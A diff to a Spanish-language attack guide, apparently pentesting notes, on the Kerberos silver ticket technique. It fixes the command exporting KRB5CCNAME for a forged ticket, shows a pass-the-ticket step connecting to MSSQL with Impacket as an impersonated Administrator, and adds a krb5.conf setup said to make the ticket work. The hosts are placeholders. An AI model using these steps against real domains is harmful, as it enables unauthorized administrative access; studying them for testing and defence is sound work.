@@ -87,7 +87,7 @@ Para realizar un ataque de *silver ticket*, necesitas lo siguiente:
 2. **Configurar la variable de entorno para el ticket Kerberos**:
    - Exporta el ticket para usarlo con otras herramientas de Impacket.
      ```bash
-     export KRB5CCNAME={PWD}/<nombre_ticket>.ccache
+     export KRB5CCNAME=$(pwd)/<nombre_ticket>.ccache
      ```
 
 3. **Realizar Pass-the-Ticket (PTT)**:
@@ -102,6 +102,30 @@ Para realizar un ataque de *silver ticket*, necesitas lo siguiente:
          python3 mssqlclient.py -k example/Administrator@sqlserver.example.com -dc-ip 192.168.1.10
          ```
        - Esto conecta al servicio MSSQL como el usuario impersonado (por ejemplo, `Administrator`).
+
+## Archivo /etc/krb5user.conf o /etc/krb5.conf
+- Este archivo es necesario para que el ticket funcione correctamente.
+
+```bash
+[libdefaults]
+        default_realm = EXAMPLE.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+        dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        EXAMPLE.COM = {
+                kdc = dc01.example.com
+        }
+
+[domain_realm]
+        .example.com = EXAMPLE.COM
+``` 
+
 
 ## Notas
 - Asegúrate de que el reloj del sistema esté sincronizado con el controlador de dominio para evitar problemas con los tickets Kerberos.
